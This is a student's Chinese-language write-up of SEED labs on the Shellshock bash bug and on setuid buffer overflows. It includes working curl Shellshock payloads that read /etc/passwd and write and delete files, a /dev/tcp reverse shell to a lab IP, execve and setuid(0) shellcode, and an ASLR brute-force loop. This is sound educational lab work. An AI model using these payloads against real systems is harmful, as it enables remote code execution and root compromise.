<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ dcbuild		# Alias for: docker-compose build</span><br><span class="line">$ dcup			# Alias for: docker-compose up</span><br><span class="line">$ dcdown		# Alias for: docker-compose down</span><br><span class="line">$ dockps 		// Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br><span class="line">$ docksh &lt;id&gt; 	// Alias for: docker exec -it &lt;id&gt; /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="Task-1-Experimenting-with-Bash-Function"><a href="#Task-1-Experimenting-with-Bash-Function" class="headerlink" title="Task 1: Experimenting with Bash Function"></a>Task 1: Experimenting with Bash Function</h2><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107121759651.png" alt="image-20230107121759651"></p>
<p>定义一个环境变量<code>foo</code>，里面是函数定义+一个恶意命令小尾巴</p>
<p>导出之后作为环境变量传递给有漏洞的bash，恶意命令会得到执行</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107122039295.png" alt="image-20230107122039295"></p>
<p>而运行没有漏洞的bash，则不仅恶意代码不会执行，连变量都没有</p>
<h2 id="Task-2-Passing-Data-to-Bash-via-Environment-Variable"><a href="#Task-2-Passing-Data-to-Bash-via-Environment-Variable" class="headerlink" title="Task 2: Passing Data to Bash via Environment Variable"></a>Task 2: Passing Data to Bash via Environment Variable</h2><p><code>docker-compose up</code>启动容器</p>
<p>容器的Web服务器上有这么一个cgi（getenv.cgi）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash_shellshock</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/plain&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;****** Environment Variables ******&quot;</span></span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure>

<p>使用浏览器（火狐）访问，确实发现了火狐的相关内容的环境变量：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107124948906.png" alt="image-20230107124948906"></p>
<p>使用<code>curl</code>工具</p>
<p><code>curl -A &quot;my data&quot; -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107125322577.png" alt="image-20230107125322577"></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107125342599.png" alt="image-20230107125342599"></p>
<p>发现通过<code>-A</code>可以通过<code>User-Agent</code>字段注入环境变量</p>
<p><code>curl -e &quot;my data&quot; -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</code>：<code>Referer</code>字段</p>
<p><code>curl -H &quot;AAAAAA: BBBBBB&quot; -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</code>：自定义Header头</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107125546049.png" alt="image-20230107125546049"></p>
<h2 id="Task-3-Launching-the-Shellshock-Attack"><a href="#Task-3-Launching-the-Shellshock-Attack" class="headerlink" title="Task 3: Launching the Shellshock Attack"></a>Task 3: Launching the Shellshock Attack</h2><blockquote>
<p>Shellshock attack does not depend on what is in the CGI program, as it targets the bash program, which is invoked before the actual CGI script is executed.</p>
</blockquote>
<p><code>vul.cgi</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash shellshock</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/plain&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>If your command has a plain-text output, and you want the output returned to you, your output needs to follow a protocol: it should start with <code>Content type: text/plain</code>, followed by an empty line, and then you can place your plain-text output.</p>
</blockquote>
<blockquote>
<p>For example, if you want the server to return a list of files in its folder, your command will look like the following:</p>
<p><code>echo Content_type: text/plain; echo; /bin/ls -l</code></p>
</blockquote>
<p>Task 3.A: Get the server to send back the content of the <code>/etc/passwd</code> file.</p>
<p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107145912169.png" alt="image-20230107145912169"></p>
<p>Task 3.B: Get the server to tell you its process’ user ID. You can use the <code>/bin/id</code> command to print out the ID information.</p>
<p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107145955561.png" alt="image-20230107145955561"></p>
<p>Task 3.C: Get the server to create a file inside the <code>/tmp</code> folder. You need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the <code>/tmp</code> folder.</p>
<p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; echo &#39;haha&#39;&gt;/tmp/test_file;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107151306170.png" alt="image-20230107151306170"></p>
<p>Task 3.D: Get the server to delete the file that you just created inside the <code>/tmp</code> folder.</p>
<p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test_file;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107152129308.png" alt="image-20230107152129308"></p>
<blockquote>
<p>Question 1: Will you be able to steal the content of the shadow file &#x2F;etc&#x2F;shadow from the server? Why or why not? The information obtained in Task 3.B should give you a clue.</p>
</blockquote>
<p>不行，运行cgi程序的用户不是root，没有权限</p>
<blockquote>
<p>Question 2: HTTP GET requests typically attach data in the URL, after the ? mark. This could be another approach that we can use to launch the attack. In the following example, we attach some data in the URL, and we found that the data are used to set the following environment variable:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA&quot;</span></span><br><span class="line">...</span><br><span class="line">UERY_STRING=AAAAA</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>Can we use this method to launch the Shellshock attack? Please conduct your experiment and derive your conclusions based on your experiment results.</p>
</blockquote>
<p>好像不太行？URL编码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;www.seedlab-shellshock.com/cgi-bin/getenv.cgi?()%20%7B%20echo%20hello;%20%7D;%20echo%20Content_type:%20text/plain;%20echo;%20/bin/id;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107153318562.png" alt="image-20230107153318562"></p>
<p>没有URL编码则400 Bad Request：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107153345179.png" alt="image-20230107153345179"></p>
<h2 id="Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack"><a href="#Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack" class="headerlink" title="Task 4: Getting a Reverse Shell via Shellshock Attack"></a>Task 4: Getting a Reverse Shell via Shellshock Attack</h2><blockquote>
<p>Reverse shell is a shell process started on a machine, with its input and output being controlled by somebody from a remote computer. Basically, the shell runs on the victim’s machine, but it takes input from the attacker machine and also prints its output on the attacker’s machine. Reverse shell gives attackers a convenient way to run commands on a compromised machine. Detailed explanation of how to create a reverse shell can be found in the SEED book. We also summarize the explanation in Section 4. In this task, you need to demonstrate how you can get a reverse shell from the victim using the Shellshock attack.</p>
</blockquote>
<blockquote>
<p>The key idea of reverse shell is to redirect its standard input, output, and error devices to a network connection, so the shell gets its input from the connection, and prints out its output also to the connection.</p>
</blockquote>
<p>宿主机（Attacker）：<code>nc -nv -l 9090</code></p>
<p>受害者（Victim）：<code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1</code></p>
<hr>
<p>攻击者首先监听本地9091端口：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107162046863.png" alt="image-20230107162046863"></p>
<p>随后新shell攻击受害者：</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107162106405.png" alt="image-20230107162106405"></p>
<p>建立反弹shell成功，可以<code>www-data</code>用户执行任意命令</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107162156299.png" alt="image-20230107162156299"></p>
<h2 id="Task-5-Using-the-Patched-Bash"><a href="#Task-5-Using-the-Patched-Bash" class="headerlink" title="Task 5: Using the Patched Bash"></a>Task 5: Using the Patched Bash</h2><blockquote>
<p>Now, let us use a bash program that has already been patched. The program &#x2F;bin&#x2F;bash is a patched version. Please replace the first line of the CGI programs with this program. Redo Task 3 and describe your observations.</p>
</blockquote>
<p>都没用啦，都被修啦</p>
<h1 id="03-01-Buffer-Overflow-Setuid"><a href="#03-01-Buffer-Overflow-Setuid" class="headerlink" title="03_01_Buffer_Overflow_Setuid"></a>03_01_Buffer_Overflow_Setuid</h1><p>关闭地址空间随机化：<code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
<p>修改<code>/bin/sh</code>指向<code>zsh</code>：<code>sudo ln -sf /bin/zsh /bin/sh</code></p>
<h2 id="Task-1-Getting-Familiar-with-Shellcode"><a href="#Task-1-Getting-Familiar-with-Shellcode" class="headerlink" title="Task 1: Getting Familiar with Shellcode"></a>Task 1: Getting Familiar with Shellcode</h2><blockquote>
<p>A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following:</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Unfortunately, we cannot just compile this code and use the binary code as our shellcode (detailed explanation is provided in the SEED book, <strong>P75</strong>). The best way to write a shellcode is to use assembly code. In this lab, we only provide the binary version of a shellcode, without explaining how it works (it is non-trivial). If you are interested in how exactly shellcode works and you want to write a shellcode from scratch, you can learn that from a separate SEED lab called <em>Shellcode Lab</em>.</p>
</blockquote>
<p><strong>32-bit Shellcode</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; Store the command on stack</span><br><span class="line">xor	 eax, eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov  ebx, esp 		; ebx --&gt; &quot;/bin//sh&quot;: execve()’s 1st argument</span><br><span class="line"></span><br><span class="line">; Construct the argument array argv[]</span><br><span class="line">push eax 			; argv[1] = 0</span><br><span class="line">push ebx 			; argv[0] --&gt; &quot;/bin//sh&quot;</span><br><span class="line">mov  ecx, esp 		; ecx --&gt; argv[]: execve()’s 2nd argument</span><br><span class="line"></span><br><span class="line">; For environment variable</span><br><span class="line">xor  edx, edx 		; edx = 0: execve()’s 3rd argument</span><br><span class="line"></span><br><span class="line">; Invoke execve()</span><br><span class="line">xor  eax, eax 		;</span><br><span class="line">mov  al,  0x0b 		; execve()’s system call number</span><br><span class="line">int  0x80</span><br></pre></td></tr></table></figure>



<p><strong>64-bit Shellcode</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor  rdx, rdx 			; rdx = 0: execve()’s 3rd argument</span><br><span class="line">push rdx</span><br><span class="line">mov  rax, ’/bin//sh’	; the command we want to run</span><br><span class="line">push rax 				;</span><br><span class="line">mov  rdi, rsp 			; rdi --&gt; &quot;/bin//sh&quot;: execve()’s 1st argument</span><br><span class="line">push rdx 				; argv[1] = 0</span><br><span class="line">push rdi 				; argv[0] --&gt; &quot;/bin//sh&quot;</span><br><span class="line">mov  rsi, rsp 			; rsi --&gt; argv[]: execve()’s 2nd argument</span><br><span class="line">xor  rax, rax</span><br><span class="line">mov  al,  0x3b 			; execve()’s system call number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h3 id="Task-Invoking-the-Shellcode"><a href="#Task-Invoking-the-Shellcode" class="headerlink" title="Task: Invoking the Shellcode"></a>Task: Invoking the Shellcode</h3><p><strong>call_shellcode.c</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Binary code for setuid(0) </span></span><br><span class="line"><span class="comment">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">    <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> code[<span class="number">500</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(code, shellcode); <span class="comment">// Copy the shellcode to the stack</span></span><br><span class="line">    <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())code;</span><br><span class="line">    func(); <span class="comment">// Invoke the shellcode from the stack</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Task-2-Understanding-the-Vulnerable-Program"><a href="#Task-2-Understanding-the-Vulnerable-Program" class="headerlink" title="Task 2: Understanding the Vulnerable Program"></a>Task 2: Understanding the Vulnerable Program</h2><p><code>gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c</code><br><code>sudo chown root stack</code><br><code>sudo chmod 4755 stack</code></p>
<p>或者可以直接<code>make</code></p>
<h2 id="Task-3-Launching-Attack-on-32-bit-Program-Level-1"><a href="#Task-3-Launching-Attack-on-32-bit-Program-Level-1" class="headerlink" title="Task 3: Launching Attack on 32-bit Program (Level 1)"></a>Task 3: Launching Attack on 32-bit Program (Level 1)</h2><blockquote>
<p>the most important thing to know is the distance between the buffer’s starting position and the place where the return-address is stored</p>
</blockquote>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230118195204508.png" alt="image-20230118195204508"></p>
<p>可见<code>ebp</code>的值，以及buffer的起始位置</p>
<blockquote>
<p>When <code>gdb</code> stops inside the <code>bof()</code> function, it stops before the <code>ebp</code> register is set to point to the current stack frame, so if we print out the value of <code>ebp</code> here, we will get the caller’s <code>ebp</code> value. We need to use <code>next</code> to execute a few instructions and stop after the <code>ebp</code> register is modified to point to the stack frame of the <code>bof()</code> function.</p>
</blockquote>
<blockquote>
<p>It should be noted that the frame pointer value obtained from <code>gdb</code> is different from that during the actual execution (without using <code>gdb</code>). This is because <code>gdb</code> has pushed some environment data into the stack before running the debugged program. When the program runs directly without using <code>gdb</code>, the stack does not have those data, so the actual frame pointer value will be <strong>larger</strong>（<strong>更高</strong>）. You should keep this in mind when constructing your payload.</p>
</blockquote>
<p>0xffffcb08 - 0xffffca9c &#x3D; 108</p>
<p>返回地址在<code>$ebp</code>的上面4个字节处（32位），所以返回地址到buffer起始位置的距离为112</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230118203749549.png" alt="image-20230118203749549"></p>
<p>done</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230118203850518.png" alt="image-20230118203850518"></p>
<h2 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><a href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2" class="headerlink" title="Task 4: Launching Attack without Knowing Buffer Size (Level 2)"></a>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</h2><p>这次模拟不知道buffer的具体大小，只知道范围是100~200字节</p>
<p>但有个提示，就是<code>ebp</code>的值总是4的倍数</p>
<p><del>168</del></p>
<h2 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><a href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3" class="headerlink" title="Task 5: Launching Attack on 64-bit Program (Level 3)"></a>Task 5: Launching Attack on 64-bit Program (Level 3)</h2><p>变成64位</p>
<blockquote>
<p>Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space, only the address from <code>0x00</code> through <code>0x00007FFFFFFFFFFF</code> is allowed. That means for every address (8 bytes), the highest two bytes are always zeros. This causes a problem.</p>
<p>In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied into the stack via <code>strcpy()</code>. We know that the <code>strcpy()</code> function will stop copying when it sees a zero. Therefore, if zero appears in the middle of the payload, the content after the zero cannot be copied into the stack. How to solve this problem is the most difficult challenge in this attack.</p>
</blockquote>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230118205820028.png" alt="image-20230118205820028"></p>
<p>位置是208 + 8</p>
<p>换成64位的shellcode</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230118210330483.png" alt="image-20230118210330483"></p>
<p>不行</p>
<h2 id="Task-6-Launching-Attack-on-64-bit-Program-Level-4"><a href="#Task-6-Launching-Attack-on-64-bit-Program-Level-4" class="headerlink" title="Task 6: Launching Attack on 64-bit Program (Level 4)"></a>Task 6: Launching Attack on 64-bit Program (Level 4)</h2><h2 id="Tasks-7-Defeating-dash’s-Countermeasure"><a href="#Tasks-7-Defeating-dash’s-Countermeasure" class="headerlink" title="Tasks 7: Defeating dash’s Countermeasure"></a>Tasks 7: Defeating dash’s Countermeasure</h2><blockquote>
<p>The <code>dash</code> shell in the Ubuntu OS drops privileges when it detects that the effective UID does not equal to the real UID (which is the case in a <code>Set-UID</code> program). This is achieved by changing the effective UID back to the real UID, essentially, dropping the privilege.</p>
</blockquote>
<p>改回<code>sh</code>指向的shell为<code>dash</code>：<code>sudo ln -sf /bin/dash /bin/sh</code></p>
<blockquote>
<p>To defeat the countermeasure in buffer-overflow attacks, all we need to do is to change the real UID, so it equals the effective UID. When a root-owned <code>Set-UID</code> program runs, the effective UID is zero, so before we invoke the shell program, we just need to change the real UID to zero. We can achieve this by invoking <code>setuid(0)</code> before executing <code>execve()</code> in the shellcode.</p>
</blockquote>
<p>把下列汇编代码加在shellcode之前即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; Invoke setuid(0): 32-bit</span><br><span class="line">xor ebx, ebx ; ebx = 0: setuid()’s argument</span><br><span class="line">xor eax, eax</span><br><span class="line">mov al, 0xd5 ; setuid()’s system call number</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">; Invoke setuid(0): 64-bit</span><br><span class="line">xor rdi, rdi ; rdi = 0: setuid()’s argument</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 0x69 ; setuid()’s system call number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>发现没加就是普通的shell，加了就是root的shell</p>
<h2 id="Task-8-Defeating-Address-Randomization"><a href="#Task-8-Defeating-Address-Randomization" class="headerlink" title="Task 8: Defeating Address Randomization"></a>Task 8: Defeating Address Randomization</h2><blockquote>
<p>On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base address can have 2^19^ &#x3D; 524,288 possibilities. This number is not that high and can be exhausted easily with the brute-force approach.</p>
</blockquote>
<p>重新打开地址空间随机化：<code>sudo /sbin/sysctl -w kernel.randomize_va_space=2</code></p>
<p>暴力运行<code>stack-L1</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    value=$(( <span class="variable">$value</span> + <span class="number">1</span> ))</span><br><span class="line">    duration=<span class="variable">$SECONDS</span></span><br><span class="line">    min=$((<span class="variable">$duration</span> / <span class="number">60</span>))</span><br><span class="line">    sec=$((<span class="variable">$duration</span> % <span class="number">60</span>))</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$min</span> minutes and <span class="variable">$sec</span> seconds elapsed.&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The program has been running <span class="variable">$value</span> times so far.&quot;</span></span><br><span class="line">    ./stack-L1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>跑了一会儿就出来了（13816次）</p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230118214856343.png" alt="image-20230118214856343"></p>
<blockquote>
<p>Brute-force attacks on 64-bit programs is much harder, because the entropy is much larger. Although this is not required, free free to try it just for fun. Let it run overnight. Who knows, you may be very lucky.</p>
</blockquote>
